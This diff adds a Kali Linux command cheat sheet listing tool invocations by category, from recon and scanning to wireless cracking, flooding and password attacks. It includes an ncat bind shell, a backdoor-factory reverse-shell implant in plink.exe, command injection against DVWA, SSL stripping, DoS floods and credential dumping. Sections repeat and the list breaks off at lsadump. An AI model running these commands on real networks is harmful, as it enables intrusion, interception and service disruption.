@@ -1,0 +1,846 @@
+Information Gathering 
+---------------------
+{
+
+	root@kali:~# acccheck.pl -T smb-ips.txt -v
+	root@kali:~# ace -i eth0 -c 1 -m 00:1E:F7:28:9C:8E
+	amap -bqv 192.168.1.15 80
+	root@kali:~# automater -s robtex 50.116.53.73
+	root@kali:~# bing-ip2hosts -p microsoft.com
+	root@kali:~# bing-ip2hosts -p 173.194.33.80
+	root@kali:~# braa public@192.168.1.215:.1.3.6.*
+	root@kali:~# casefile
+	root@kali:~# cdpsnarf -i eth0 -w cdpsnarf.pcap
+	root@kali:~# cisco-torch -A 192.168.99.202
+	root@kali:~# cookie-cadger
+	root@kali:~# copy-router-config.pl 192.168.1.1 192.168.1.15 private
+	root@kali:~# merge-router-config.pl 192.168.1.1 192.168.1.15 private
+	root@kali:~# dmitry -winsepo example.txt example.com
+	{
+		root@kali:~# echo "nmap -F 192.168.1.0/24 -v -n -oA sub1" >> dnmap.txt
+		root@kali:~# echo "nmap -F 192.168.0.0/24 -v -n -oA sub0" >> dnmap.txt
+		root@kali:~# dnmap_server -f dnmap.txt
+	}
+	root@kali:~# dnsenum --noreverse -o mydomain.xml example.com
+	root@kali:~# dnsmap example.com -w /usr/share/wordlists/dnsmap.txt
+	{
+		root@kali:~# echo "example.com" >> domains.txt
+		root@kali:~# echo "example.org" >> domains.txt
+		root@kali:~# dnsmap-bulk.sh domains.txt
+	}
+	root@kali:~# dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml
+	root@kali:~# dnstracer -r 3 -v example.com
+	root@kali:~# dnswalk example.com.
+	root@kali:~# dnswalk -r -d example.com.
+	root@kali:~# dotdotpwn.pl -m http -h 192.168.1.1 -M GET
+	root@kali:~# enum4linux -U -o 192.168.1.200
+	root@kali:~# enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 192.168.1.1
+	root@kali:~# fierce -dns example.com
+	root@kali:~# firewalk -S8079-8081  -i eth0 -n -pTCP 192.168.1.1 192.168.0.1
+	root@kali:~# fragroute 192.168.1.123
+	root@kali:~# fragtest ip-tracert frag-new 192.168.1.123
+	root@kali:~# fragrouter -i eth0 -F1
+	root@kali:~# ghost-phisher
+	root@kali:~# golismero scan -i /root/port80.xml -o sub1-port80.html
+	root@kali:~# goofile -d kali.org -f pdf
+	root@kali:~# hping3 --traceroute -V -1 www.example.com
+	root@kali:~# intrace -h www.example.com -p 80 -s 4
+	root@kali:~# ismtp -f smtp-ips.txt -e /usr/share/wordlists/metasploit/unix_users.txt
+	root@kali:~# lbd example.com
+	root@kali:~# cat /opt/Teeth/README.txt 
+	root@kali:~# masscan -p22,80,445 192.168.1.0/24
+	root@kali:~# metagoofil -d kali.org -t pdf -l 100 -n 25 -o kalipdf -f kalipdf.html
+	root@kali:~# miranda -i eth0 -v
+	root@kali:~# nmap -v -A -sV 192.168.1.1
+	root@kali:~# nping --tcp -p 22 --flags syn --ttl 2 192.168.1.1
+	root@kali:~# ndiff yesterday.xml today.xml
+	root@kali:~# ncat -v --exec "/bin/bash" --allow 192.168.1.123 -l 4444 --keep-open
+	root@kali:~# ntop -B "src host 192.168.1.1"
+	root@kali:~# p0f -i eth0 -p -o /tmp/p0f.log
+	root@kali:~# parsero -u www.bing.com -sb
+	root@kali:~# recon-ng 
+        root@kali:~# setoolkit
+        root@kali:~# smtp-user-enum -M VRFY -u root -t 192.168.1.25
+        root@kali:~# snmpcheck -t 192.168.1.2 -c public
+        root@kali:~# sslcaudit -l 0.0.0.0:443 -v 1
+        root@kali:~# sslsplit -D -l connections.log -j /tmp/sslsplit/ -S /tmp/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
+        root@kali:~# sslstrip -w sslstrip.log -l 8080
+        root@kali:~# sslyze --regular www.example.com
+        ipv6
+        {
+        	root@kali:~# 6to4test.sh
+        	root@kali:~# address6
+        	root@kali:~# alive6
+        	root@kali:~# covert_send6
+        	root@kali:~# covert_send6d
+        	root@kali:~# denial6
+        	root@kali:~# detect-new-ip6
+        	root@kali:~# detect_sniffer6
+        	root@kali:~# dnsdict6
+        	root@kali:~# dnsrevenum6
+        	root@kali:~# dnssecwalk
+        	root@kali:~# dos_mld.sh
+        	root@kali:~# dos-new-ip6
+        	root@kali:~# dump_router6
+        	root@kali:~# exploit6
+        	root@kali:~# extract_hosts6.sh
+        	root@kali:~# extract_networks6.sh
+        	root@kali:~# fake_advertise6
+        	root@kali:~# fake_dhcps6
+        	root@kali:~# fake_dns6d
+        	root@kali:~# fake_dnsupdate6
+        	root@kali:~# fake_mipv6
+        	root@kali:~# fake_mld26
+        	root@kali:~# fake_mld6
+        	root@kali:~# fake_mldrouter6
+        	root@kali:~# fake_pim6
+        	root@kali:~# fake_router26
+        	root@kali:~# fake_router6
+        	root@kali:~# fake_solicitate6
+        	root@kali:~# firewall6
+        	root@kali:~# flood_advertise6
+        	root@kali:~# flood_dhcpc6
+        	root@kali:~# flood_mld26
+        	root@kali:~# flood_mld6
+        	root@kali:~# flood_mldrouter6
+        	root@kali:~# flood_router26
+        	root@kali:~# flood_router6
+        	root@kali:~# flood_solicitate6
+        	root@kali:~# fragmentation6
+        	root@kali:~# fuzz_ip6
+        	root@kali:~# implementation6
+        	root@kali:~# implementation6d
+        	root@kali:~# inject_alive6
+		root@kali:~# inject_alive6
+		root@kali:~# inverse_lookup6
+		root@kali:~# kill_router6
+		root@kali:~# ndpexhaust26
+		root@kali:~# ndpexhaust26
+		root@kali:~# node_query6
+		root@kali:~# parasite6
+		root@kali:~# passive_discovery6
+		root@kali:~# randicmp6
+		root@kali:~# redir6
+		root@kali:~# redirsniff6
+		root@kali:~# rsmurf6
+		root@kali:~# sendpees6
+		root@kali:~# smurf6
+		root@kali:~# thcping6
+		root@kali:~# thcsyn6
+		root@kali:~# toobig6
+		root@kali:~# trace6
+		root@kali:~# address6 fe80::76d4:35ff:fe4e:39c8
+		root@kali:~# alive6 eth0
+		root@kali:~# detect-new-ip6 eth0
+		root@kali:~# dnsdict6 example.com
+	}
+	root@kali:~# theharvester -d kali.org -l 500 -b google
+	root@kali:~# tlssled 192.168.1.1 443
+	root@kali:~# twofi -h
+	root@kali:~# urlcrazy -k dvorak -r example.com
+	root@kali:~# tshark -h
+	root@kali:~# tshark -f "tcp port 80" -i eth0
+	root@kali:~# wireshark
+	root@kali:~# wol-e -f
+	root@kali:~# xplico -m rltm -i eth0
+	
+Vulnerability Analysis
+----------------------
+{
+	root@kali:~# bbqsql
+	root@kali:~# bed -s HTTP -t 192.168.1.15
+	root@kali:~# CAT -h 192.168.99.230 -p 23 -a /usr/share/wordlists/nmap.lst 
+	root@kali:~# cge.pl 192.168.99.230 3
+	root@kali:~# cisco-ocs 192.168.99.200 192.168.99.202
+	root@kali:~# cisco-torch -A 192.168.99.202
+	root@kali:~# copy-router-config.pl 192.168.1.1 192.168.1.15 private
+	root@kali:~# merge-router-config.pl 192.168.1.1 192.168.1.15 private
+	root@kali:~# dbpwaudit -s 192.168.1.130 -d testdb -D MySQL -U root -P /usr/share/wordlists/nmap.lst
+	root@kali:~# doona -m HTTP -t 192.168.1.15 -M 5
+	root@kali:~# dotdotpwn.pl -m http -h 192.168.1.1 -M GET
+	root@kali:~# gsad -f -p 8888 -R
+	root@kali:~# hexorbase
+	root@kali:~# inguma
+	root@kali:~# jsql
+	root@kali:~# lynis -Q --cronjob
+	root@kali:~# ohrwurm -a 192.168.1.123 -b 192.168.1.15 -A 6970 -B 6970 -i eth0
+	root@kali:~# openvasad --listen=127.0.0.1 --port=9393 --scanner-config-file=/etc/openvas/openvassd.conf
+	root@kali:~# omp -h 127.0.0.1 -u admin -p 9390 -g
+	root@kali:~# openvasmd -a 127.0.0.1 -p 9390 -l 127.0.0.1 -s 9391
+	root@kali:~# openvassd -f -a 192.168.1.202 -p 8888
+	root@kali:~# oscanner -s 192.168.1.15 -P 1040
+	root@kali:~# powerfuzzer
+	root@kali:~# sfuzz -S 192.168.1.1 -p 10443 -T -f /usr/share/sfuzz/sfuzz-sample/basic.http
+	root@kali:~# sidguess -i 192.168.1.205 -d /usr/share/wordlists/metasploit/unix_users.txt
+	root@kali:~# siparmyknife
+	root@kali:~# sqlmap -u "http://192.168.1.250/?p=1&forumaction=search" --dbs
+	root@kali:~# sqlninja -m t -f /root/sqlninja.conf 
+	root@kali:~# sqlsus -g sqlsus.cfg
+	root@kali:~# tnscmd10g version -h 192.168.1.205
+	root@kali:~# unix-privesc-check standard
+	root@kali:~# yersinia -G
+	
+	
+}
+
+Exploitation Tools
+------------------
+{
+	root@kali:~# teamserver
+	root@kali:~# armitage
+	root@kali:~# teamserver 192.168.1.202 s3cr3t
+	root@kali:~# backdoor-factory -f /usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s reverse_shell_tcp
+	root@kali:~# beef-xss 
+	root@kali:~# CAT -h 192.168.99.230 -p 23 -a /usr/share/wordlists/nmap.lst 
+	root@kali:~# cge.pl 192.168.99.230 3
+	root@kali:~# cisco-ocs 192.168.99.200 192.168.99.202
+	root@kali:~# cisco-torch -A 192.168.99.202
+	root@kali:~# commix --url http://192.168.20.12/dvwa/vulnerabilities/exec/  --cookie='PHPSESSID=cj645co26lgve7ro1kc9dvt3a0; security=low' \
+		     >   --data='ip=INJECT_HERE&Submit=Submit'
+	root@kali:~# crackle -i ltk_exchange.pcap -o ltk-decrypted.pcap
+	root@kali:~# searchsploit oracle windows remote
+	root@kali:~# root@kali:~# jboss-win
+	root@kali:~# jboss-linux
+	root@kali:~# jboss-linux 192.168.1.200 8080 2> /dev/null
+	root@kali:/usr/share/linux-exploit-suggester# ./Linux_Exploit_Suggester.pl -k 3.0.0
+	root@kali:~# cat /opt/Teeth/README.txt 
+	root@kali:~# setoolkit
+	root@kali:~# shellnoob -i --to-opcode
+	root@kali:~# sqlmap -u "http://192.168.1.250/?p=1&forumaction=search" --dbs
+	root@kali:~# yersinia -G
+}
+
+Exploitation Tools
+------------------
+{
+	root@kali:~# teamserver
+	root@kali:~# armitage
+	root@kali:~# teamserver 192.168.1.202 s3cr3t
+	root@kali:~# backdoor-factory -f /usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s reverse_shell_tcp
+	root@kali:~# beef-xss 
+	root@kali:~# CAT -h 192.168.99.230 -p 23 -a /usr/share/wordlists/nmap.lst 
+	root@kali:~# cge.pl 192.168.99.230 3
+	root@kali:~# cisco-ocs 192.168.99.200 192.168.99.202
+	root@kali:~# cisco-torch -A 192.168.99.202
+	root@kali:~# commix --url http://192.168.20.12/dvwa/vulnerabilities/exec/  --cookie='PHPSESSID=cj645co26lgve7ro1kc9dvt3a0; security=low' \
+			>   --data='ip=INJECT_HERE&Submit=Submit'
+	root@kali:~# crackle -i ltk_exchange.pcap -o ltk-decrypted.pcap
+	root@kali:~# searchsploit oracle windows remote
+	root@kali:~# jboss-win
+	root@kali:~# jboss-linux
+	root@kali:~# jboss-linux 192.168.1.200 8080 2> /dev/null
+	root@kali:/usr/share/linux-exploit-suggester# ./Linux_Exploit_Suggester.pl -k 3.0.0
+	root@kali:~# cat /opt/Teeth/README.txt 
+	root@kali:~# setoolkit
+	root@kali:~# shellnoob -i --to-opcode
+	root@kali:~# sqlmap -u "http://192.168.1.250/?p=1&forumaction=search" --dbs
+	root@kali:~# airbase-ng --help
+	root@kali:~# aircrack-ng --help
+	root@kali:~# airdecap-ng --help
+	root@kali:~# airdecloak-ng --help
+	root@kali:~# airdriver-ng --help
+	root@kali:~# aireplay-ng --help
+	root@kali:~# airmon-ng --help
+	root@kali:~# airmon-zc --help
+	root@kali:~# airodump-ng --help
+	root@kali:~# airolib-ng --help
+	root@kali:~# airserv-ng --help
+	root@kali:~# airtun-ng --help
+	root@kali:~# besside-ng --help
+	root@kali:~# buddy-ng -h
+	root@kali:~# easside-ng -h
+	root@kali:~# ivstools
+	root@kali:~# kstats
+	root@kali:~# makeivs-ng --help
+	root@kali:~# packetforge-ng --help
+	root@kali:~# tkiptun-ng --help
+	root@kali:~# wesside-ng -h
+	root@kali:~# wpaclean
+}	
+	
+
+Wireless Attacks
+----------------
+{	
+	root@kali:~# airdriver-ng detect
+	root@kali:~# airmon-ng start wlan0 6
+	root@kali:~# airodump-ng -c 6 --bssid 38:60:77:23:B1:CB -w capture mon0
+	root@kali:~# aircrack-ng -w /usr/share/wordlists/nmap.lst capture-01.cap 
+	root@kali:~# asleap -h
+	root@kali:~# genkeys
+	root@kali:~# genkeys -r /usr/share/wordlists/nmap.lst -f asleap.dat -n asleap.idx
+	root@kali:~# asleap -r leap.dump -f asleap.dat -n asleap.idx -s
+	root@kali:~# bluelog -h
+	root@kali:~# bluelog 
+	root@kali:~# bluemaho.py
+	root@kali:~# bluepot
+	root@kali:~# blueranger.sh
+	root@kali:~# blueranger.sh hci1 20:C9:D0:43:4B:D8
+	root@kali:~# bluesnarfer
+	root@kali:~# bluesnarfer -b 20:C9:D0:43:4B:D8 -i
+	root@kali:~# bully -h
+	root@kali:~# bully -e 6F36E6 mon0
+	root@kali:~# cowpatty -h
+	root@kali:~# genpmk -h
+	root@kali:~# genpmk -f /usr/share/wordlists/nmap.lst -d cowpatty_dict -s securenet
+	root@kali:~# cowpatty -d cowpatty_dict -r Kismet-20140515-16-21-37-1.pcapdump -s 6F36E6 cowpatty 4.6 - WPA-PSK dictionary attack. <jwright@hasborg.com>
+	root@kali:~# crackle
+	root@kali:~# crackle -i ltk_exchange.pcap -o ltk-decrypted.pcap
+	root@kali:~# eapmd5pass -h
+	root@kali:~# fern-wifi-cracker
+	root@kali:~# ghost-phisher
+	root@kali:~# giskismet -h
+	root@kali:~# gqrx -h
+	root@kali:~# gr-scan --help
+	root@kali:~# gr-scan -x 100 -y 105 -p 5
+	root@kali:~# kal -s GSM850
+	root@kali:~# zbgoodfind -h
+	root@kali:~# zbassocflood -h
+	root@kali:~# zbreplay -h
+	root@kali:~# zbdsniff
+	root@kali:~# zbconvert -h
+	root@kali:~# zbdump -h
+	root@kali:~# zbstumbler -h
+	root@kali:~# kismet_server -h
+	root@kali:~# kismet_client -h
+	root@kali:~# kismet_drone -h
+	root@kali:~# kismet -h
+	root@kali:~# kismet_server -c wlan0 --use-gpsd-gps
+	root@kali:~# kismet
+	root@kali:~# mdk3 wlan0 a
+	root@kali:~# mfterm -h
+	root@kali:~# rtl_fm -f 149.614M -s 22050 -p -19 | multimon-ng -t raw -a POCSAG512 -a POCSAG1200 -a POCSAG2400 -a SCOPE -f alpha /dev/stdin
+	root@kali:~# pixiewps \
+	>    -a 7f:de:11:b9:69:1c:de:26:4a:21:a4:6f:eb:3d:b8:aa:aa:d7:30:09:09:32:b8:24:43:9b:e0:91:78:e7:6f:2c \
+	>    -e d4:38:91:0d:4e:6e:15:fe:70:f0:97:a8:70:2a:b8:94:f5:75:74:bf:64:19:9f:92:82:9b:e0:2c:c0:a3:75:48:08:8f:63:0a:82:37:0c:b7:95:42:cf:55:ca:a5:f0:f7:6c:b2:c7:5f:0e:23:18:44:f4:2d:00:f1:da:d4:94:23:56:c7:2c:b0:f6:87:c7:77:d0:cc:11:35:cf:b7:4f:bc:44:8d:ca:35:8a:78:3d:99:7f:2b:cf:44:21:d8:e2:0f:3c:7d:a4:72:c8:03:6f:77:2a:e9:fa:c1:e9:a8:2c:74:65:99:5a:e0:a5:26:d9:23:5e:4e:ec:5a:07:07:ab:80:db:3f:5f:18:7f:fa:fa:f1:57:74:b2:8d:a9:97:a6:c6:0a:a5:e0:ec:93:09:23:67:f6:3e:ec:1f:55:32:a4:5d:73:8f:ab:91:74:cf:1d:79:85:12:c1:81:f5:ea:a6:68:9d:8e:c7:c6:be:01:dc:d9:f8:68:80:11:55:d7:44:6a \
+	>    -r bc:ad:54:2f:88:44:7c:12:69:ef:34:31:4a:17:1c:92:b1:d7:06:4c:73:be:9f:d3:ed:87:63:74:10:46:0f:46:8c:36:b5:d4:a0:ba:af:85:9c:b2:30:42:d7:59:43:75:5a:d7:79:96:fb:ee:7b:66:db:b7:a8:f9:22:9c:a5:d3:b8:e7:c0:c4:5c:58:34:1f:56:a8:1a:41:a8:d2:e8:f6:3e:c9:3a:93:d9:9b:59:5c:a8:e0:78:84:6c:fc:05:e8:76:a3:e6:3b:33:94:4a:a9:ff:50:fb:60:fa:97:3b:6d:cc:04:f1:5e:36:24:a9:06:7a:f8:6b:00:e9:71:9d:89:be:9c:b2:9c:1f:ca:6d:d6:4d:ab:46:3d:b3:11:1f:8d:40:f7:c8:a4:39:48:c5:ca:1b:f6:30:95:7d:d9:68:41:ef:0a:37:b2:4a:37:e4:a4:b0:dd:7e:c1:af:3e:66:ea:bf:16:0a:7a:8a:05:00:01:a4:29:77:a9:d4:81:d4:0e \
+	>    -s 90:5f:f5:7d:93:e5:c4:3c:62:0d:26:65:dd:59:57:d5:ba:ba:f1:b7:30:91:72:7c:54:94:38:08:1e:13:35:38 \
+	>    -z b0:2b:07:50:28:e7:6e:5f:fa:27:1b:31:92:85:43:cb:c5:6a:ec:73:e2:27:c3:b9:80:ec:5b:ed:88:f0:1e:ec
+
+	root@kali:~# reaver -h
+	root@kali:~# wash -h
+	root@kali:~# wash -i mon0 -c 6 -C
+	root@kali:~# reaver -i mon0 -b E0:3F:49:6A:57:78 -v
+	root@kali:~# fang -r 00803789EE76-00803789EEff -s
+	root@kali:~# rtlsdr-scanner
+	root@kali:~# spooftooph -i hci1 -a 00803789EE76
+	root@kali:~# wifi-honey FreeWiFi 6 wlan0
+	root@kali:~# wifiarp -h
+	root@kali:~# wifidns -h
+	root@kali:~# wifiping -h
+	root@kali:~# wifitap -h
+	root@kali:~# wifite -h
+	root@kali:~# wifite -pow 50 -wps
+	
+}
+
+
+	
+Forensics Tools
+---------------
+{
+	root@kali:~# binwalk -B dd-wrt.v24-13064_VINT_mini.bin 
+	root@kali:~# bulk_extractor -o bulk-out xp-laptop-2005-07-04-1430.img 
+	root@kali:~# chntpw -h
+	root@kali:~# cuckoo.py
+	root@kali:~# dc3dd if=/var/log/messages of=/tmp/dc3dd hash=md5
+	root@kali:~# dd_rescue -s 100 /var/log/messages -S 0 /tmp/ddrescue-out
+	root@kali:~# dff -h
+	root@kali:~# dff-gui
+	root@kali:~# dff
+	root@kali:~# python
+	root@kali:~# dumpzilla '/root/.mozilla/firefox/k780shir.default/' --All
+	root@kali:~# extundelete /dev/sda1 --restore-file root/importantfile
+	root@kali:~# foremost -t doc,jpg,pdf,xls -i image.dd 
+	root@kali:~# galleta -d";" file.txt
+	root@kali:~# guymager
+	root@kali:~# iphone-backup-analyzer
+	root@kali:~# p0f -i eth0 -p -o /tmp/p0f.log
+	root@kali:~# pdf-parser -a /usr/share/doc/texmf/fonts/lm/lm-info.pdf
+	root@kali:~# pdfid /usr/share/doc/texmf/fonts/lm/lm-info.pdf
+	root@kali:~# pdgmail -v -f file.dmp
+	root@kali:~# peepdf -x /usr/share/doc/texmf/fonts/lm/lm-info.pdf 
+	root@kali:~# regripper
+	root@kali:~# volatility -f /root/xp-laptop-2005-07-04-1430.img pslist
+	root@kali:~# xplico -m rltm -i eth0
+}
+
+Web Applications
+----------------
+{
+	root@kali:~# apache-users -h 192.168.1.202 -l /usr/share/wordlists/metasploit/unix_users.txt -p 80 -s 0 -e 403 -t 10
+	root@kali:~# arachni_web
+	root@kali:~# bbqsql
+	root@kali:~# BlindElephant.py http://192.168.1.252/wp wordpress
+	root@kali:~# burpsuite
+	root@kali:~# cutycapt --url=http://www.kali.org --out=kali.png
+	root@kali:~# davtest -url http://192.168.1.209
+	root@kali:~# deblaze.py -h
+	root@kali:~# dirb
+	root@kali:~# html2dic
+	root@kali:~# gendict
+	root@kali:~# dirb http://192.168.1.224/ /usr/share/wordlists/dirb/common.txt 
+	root@kali:~# dirbuster
+	root@kali:~# fimap -u "http://192.168.1.202/index.php"
+	root@kali:~# fl-record -h
+	root@kali:~# fl-credential-ctl -h
+	root@kali:~# fl-run-test -h
+	root@kali:~# fl-build-report -h
+	root@kali:~# fl-run-bench -h
+	root@kali:~# fl-monitor-ctl -h
+	root@kali:~# grabber -h
+	root@kali:~# grabber --spider 1 --sql --xss --url http://192.168.1.224
+}
+
+
+Stress Testing
+--------------
+{
+	root@kali:~# pig.py eth0
+	root@kali:~# fl-record -h
+	root@kali:~# fl-credential-ctl -h
+	root@kali:~# fl-run-test -h
+	root@kali:~# fl-build-report -h
+	root@kali:~# fl-run-bench -h
+	root@kali:~# fl-monitor-ctl -h
+	root@kali:~# iaxflood
+	root@kali:~# iaxflood 192.168.1.202 192.168.1.1 500
+	root@kali:~# inundator -h
+	root@kali:~# inundator -t 5 192.168.1.1
+	root@kali:~# flow6 -h
+	root@kali:~# icmp6 -h
+	root@kali:~# ns6 -h
+	root@kali:~# scan6 -h
+	root@kali:~# ra6 -h
+	root@kali:~# frag6 -h
+	root@kali:~# tcp6 -h
+	root@kali:~# rs6 -h
+	root@kali:~# rd6 -h
+	root@kali:~# ni6 -h
+	root@kali:~# jumbo6 -h
+	root@kali:~# addr6 -h
+	root@kali:~# mdk3 wlan0 a
+	root@kali:~# reaver -h
+	root@kali:~# wash -h
+	root@kali:~# wash -i mon0 -c 6 -C
+	root@kali:~# reaver -i mon0 -b E0:3F:49:6A:57:78 -v
+	root@kali:~# rtpflood 192.168.1.202 192.168.1.1 5060 5061 1000 3 123456789 kali
+	root@kali:~# slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://192.168.1.202/index.php -x 24 -p 3
+	root@kali:~# t50 --flood 192.168.1.1
+	root@kali:~# termineter 
+	root@kali:~# 6to4test.sh
+	root@kali:~# address6
+	root@kali:~# alive6
+	root@kali:~# covert_send6
+	root@kali:~# covert_send6d
+	root@kali:~# denial6
+	root@kali:~# detect-new-ip6
+	root@kali:~# detect_sniffer6
+	root@kali:~# dnsdict6
+	root@kali:~# dnsrevenum6
+	root@kali:~# dnssecwalk
+	root@kali:~# dos_mld.sh
+	root@kali:~# dos-new-ip6
+	root@kali:~# dump_router6
+	root@kali:~# exploit6
+	root@kali:~# extract_hosts6.sh
+	root@kali:~# extract_networks6.sh
+	root@kali:~# fake_advertise6
+	root@kali:~# fake_dhcps6
+	root@kali:~# fake_dns6d
+	root@kali:~# fake_dnsupdate6
+	root@kali:~# fake_mipv6
+	root@kali:~# fake_mld26
+	root@kali:~# fake_mld6
+	root@kali:~# fake_mldrouter6
+	root@kali:~# fake_pim6
+	root@kali:~# fake_router26
+	root@kali:~# fake_router6
+	root@kali:~# fake_solicitate6
+	root@kali:~# firewall6
+	root@kali:~# flood_advertise6
+	root@kali:~# flood_dhcpc6
+	root@kali:~# flood_mld26
+	root@kali:~# flood_mld6
+	root@kali:~# flood_mldrouter6
+	root@kali:~# flood_router26
+	root@kali:~# flood_router6
+	root@kali:~# flood_solicitate6
+	root@kali:~# fragmentation6
+	root@kali:~# fuzz_ip6
+	root@kali:~# implementation6
+	root@kali:~# implementation6d
+	root@kali:~# inject_alive6
+	root@kali:~# inverse_lookup6
+	root@kali:~# kill_router6
+	root@kali:~# ndpexhaust26
+	root@kali:~# node_query6
+	root@kali:~# parasite6
+	root@kali:~# passive_discovery6
+	root@kali:~# randicmp6
+	root@kali:~# redir6
+	root@kali:~# redirsniff6
+	root@kali:~# rsmurf6
+	root@kali:~# sendpees6
+	root@kali:~# sendpeesmp6
+	root@kali:~# smurf6
+	root@kali:~# thcping6
+	root@kali:~# thcsyn6
+	root@kali:~# toobig6
+	root@kali:~# trace6
+	root@kali:~# address6 fe80::76d4:35ff:fe4e:39c8
+	root@kali:~# alive6 eth0
+	root@kali:~# detect-new-ip6 eth0
+	root@kali:~# dnsdict6 example.com
+	root@kali:~# thc-ssl-dos -h
+	root@kali:~# thc-ssl-dos -l 100 192.168.1.208 443 --accept
+	
+}
+
+Sniffing & Spoofing
+-------------------
+{
+	root@kali:~# burpsuite
+	root@kali:~# dnschef 
+	root@kali:~# fiked -h
+	root@kali:~# hamster
+	root@kali:~# hexinject -h
+	root@kali:~# prettypacket -h
+	root@kali:~# hex2raw -h
+	root@kali:~# packets.tcl -h
+	root@kali:~# hexinject -s -i eth0
+	root@kali:~# prettypacket -x udp
+	root@kali:~# hex2raw 
+	root@kali:~# packets.tcl 'ethernet(dst=ff:ff:ff:ff:ee:ee,src=aa:aa:ee:ff:ff:ff,type=0x0800)+ip(ihl=5,ver=4,tos=0xc0,totlen=58,id=62912,fragoff=0,mf=0,df=0,rf=0,ttl=64,proto=1,cksum=0xe500,saddr=192.168.1.7,daddr=192.168.1.6)+icmp(type=3,code=3,unused=0)+data(str=aaaa)+udp(sport=33169,dport=10,len=10,cksum=0x94d6)+data(str=aaaa)+arp(htype=ethernet,ptype=ip,hsize=6,psize=4,op=request,shard=00:11:22:33:44:55,sproto=192.168.1.1,thard=22:22:22:22:22:22,tproto=10.0.0.1)' > packet-out
+	root@kali:~# iaxflood
+	root@kali:~# iaxflood 192.168.1.202 192.168.1.1 500
+	root@kali:~# inviteflood -h
+	root@kali:~# inviteflood eth0 5000 example.local 192.168.1.5 100
+	root@kali:~# ismtp
+	root@kali:~# ismtp -f smtp-ips.txt -e /usr/share/wordlists/metasploit/unix_users.txt
+	root@kali:~# evilgrade 
+	root@kali:~# mitmproxy -h
+	root@kali:~# mitmdump -h
+	root@kali:~# mitmproxy -p 2139
+	root@kali:~# ohrwurm -a 192.168.1.123 -b 192.168.1.15 -A 6970 -B 6970 -i eth0
+	root@kali:~# protos-sip -h
+	root@kali:~# rebind -i eth0 -d kali.local
+	root@kali:~# responder -i 192.168.1.202 -w On -r On -f On
+	root@kali:~# rtpbreak -i eth0 -g -m -d rtplog
+	root@kali:~# rtpinsertsound /usr/share/rtpinsertsound/stapler.wav -v
+	root@kali:~# rtpmixsound /usr/share/rtpmixsound/stapler.wav -v
+	root@kali:~# sctpscan -s -F -r 192.168.1.*
+	root@kali:~# siparmyknife
+	root@kali:~# sipp
+	root@kali:~# sipp -sn uas
+	root@kali:~# svcrack -h
+	root@kali:~# svcrash -h
+	root@kali:~# svreport -h
+	root@kali:~# svmap -h
+	root@kali:~# svwar -h
+	root@kali:~# svmap 192.168.1.0/24 -v
+	root@kali:~# sniffjoke --help
+	root@kali:~# sniffjokectl --help
+	root@kali:~# sj-commit-results -h
+	root@kali:~# sj-iptcpopt-probe -h
+	root@kali:~# sniffjoke-autotest -h
+	root@kali:~# sslsplit -h
+	root@kali:~# sslsplit -D -l connections.log -j /tmp/sslsplit/ -S /tmp/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
+	root@kali:~# sslstrip -h
+	root@kali:~# sslstrip -w sslstrip.log -l 8080
+	root@kali:~# 6to4test.sh
+	root@kali:~# address6
+	root@kali:~# alive6
+	root@kali:~# covert_send6
+	root@kali:~# covert_send6d
+	root@kali:~# denial6
+	root@kali:~# detect-new-ip6
+	root@kali:~# detect_sniffer6
+	root@kali:~# dnsdict6
+	root@kali:~# dnsrevenum6
+	root@kali:~# dnssecwalk
+	root@kali:~# dos_mld.sh
+	root@kali:~# dos-new-ip6
+	root@kali:~# dump_router6
+	root@kali:~# exploit6
+	root@kali:~# extract_hosts6.sh
+	root@kali:~# extract_networks6.sh
+	root@kali:~# fake_advertise6
+	root@kali:~# fake_dhcps6
+	root@kali:~# fake_dns6d
+	root@kali:~# fake_dnsupdate6
+	root@kali:~# fake_mipv6
+	root@kali:~# fake_mld26
+	root@kali:~# fake_mld6
+	root@kali:~# fake_mldrouter6
+	root@kali:~# fake_pim6
+	root@kali:~# fake_router26
+	root@kali:~# fake_router6
+	root@kali:~# fake_solicitate6
+	root@kali:~# firewall6
+	root@kali:~# flood_advertise6
+	root@kali:~# flood_dhcpc6
+	root@kali:~# flood_mld26
+	root@kali:~# flood_mld6
+	root@kali:~# flood_mldrouter6
+	root@kali:~# flood_router26
+	root@kali:~# flood_router6
+	root@kali:~# flood_solicitate6
+	root@kali:~# fragmentation6
+	root@kali:~# fuzz_ip6
+	root@kali:~# implementation6
+	root@kali:~# implementation6d
+	root@kali:~# inject_alive6
+	root@kali:~# inverse_lookup6
+	root@kali:~# kill_router6
+	root@kali:~# ndpexhaust26
+	root@kali:~# ndpexhaust26
+	root@kali:~# node_query6
+	root@kali:~# parasite6
+	root@kali:~# passive_discovery6
+	root@kali:~# randicmp6
+	root@kali:~# redir6
+	root@kali:~# redirsniff6
+	root@kali:~# rsmurf6
+	root@kali:~# sendpees6
+	root@kali:~# sendpeesmp6
+	root@kali:~# smurf6
+	root@kali:~# thcping6
+	root@kali:~# thcsyn6
+	root@kali:~# toobig6
+	root@kali:~# trace6
+	root@kali:~# address6 fe80::76d4:35ff:fe4e:39c8
+	root@kali:~# alive6 eth0
+	root@kali:~# detect-new-ip6 eth0
+	root@kali:~# dnsdict6 example.com
+	root@kali:~# voiphopper -h
+	root@kali:~# voiphopper -i eth0 -z
+	root@kali:~# webscarab
+	root@kali:~# wireshark -h
+	root@kali:~# tshark -h
+	root@kali:~# tshark -f "tcp port 80" -i eth0
+	root@kali:~# xspy 
+	root@kali:~# yersinia -h
+	root@kali:~# yersinia -G
+	root@kali:~# zaproxy
+	
+}
+
+	
+Password Attacks
+---------------------
+{
+	root@kali:~# acccheck
+	root@kali:~# acccheck.pl -T smb-ips.txt -v
+	root@kali:~# burpsuite
+	root@kali:~# cewl --help
+	root@kali:~# fab --help
+	root@kali:~# cewl -d 2 -m 5 -w docswords.txt http://docs.kali.org
+	root@kali:~# chntpw -h
+	root@kali:~# CAT
+	root@kali:~# CAT -h 192.168.99.230 -p 23 -a /usr/share/wordlists/nmap.lst 
+	root@kali:~# cmospwd -h
+	root@kali:~# cachedump
+	root@kali:~# lsadump
